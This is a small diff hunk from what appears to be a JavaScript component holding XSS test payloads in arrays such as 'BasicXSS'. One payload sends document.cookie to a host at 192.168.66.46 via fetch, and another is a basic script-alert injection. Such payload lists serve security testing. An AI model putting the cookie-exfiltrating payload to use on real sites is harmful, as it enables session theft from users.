@@ -23,7 +23,7 @@ export default (props) => {
 			title:
 				"fetch(`http://192.168.66.46/${document.cookie}`)</script>"
 		}
-		<script>
+	
 	];
 	const BasicXSS = [
 		{ title: "<script>alert('XSS')</script>" },
